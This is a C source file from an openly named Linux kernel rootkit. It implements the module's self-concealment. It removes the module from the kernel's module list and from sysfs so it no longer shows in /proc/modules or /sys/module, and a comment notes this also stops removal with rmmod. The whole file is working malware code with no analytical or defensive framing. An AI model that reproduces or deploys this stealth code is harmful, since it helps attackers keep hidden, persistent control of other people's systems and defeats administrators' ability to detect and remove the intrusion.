#include <linux/module.h>
#include <linux/mutex.h>
#include "module.h"
#include "../../utils.h"

static void rooti_hideme_from_procfs(void)
{
    list_del_rcu(&THIS_MODULE->list);
    synchronize_rcu();
}

static void rooti_hideme_from_sysfs(void)
{
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

/*
    Hides the rootkit from userspace by removing the entries from both procs (/proc/modules file)
    and sysfs (/sys/module/<module> folder). This also protects it from unloading via tools like rmmod.
*/
int rooti_hideme()
{
    ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);

    mutex_lock(__module_mutex);
    rooti_hideme_from_procfs();
    rooti_hideme_from_sysfs();
    mutex_unlock(__module_mutex);

    return 0;
}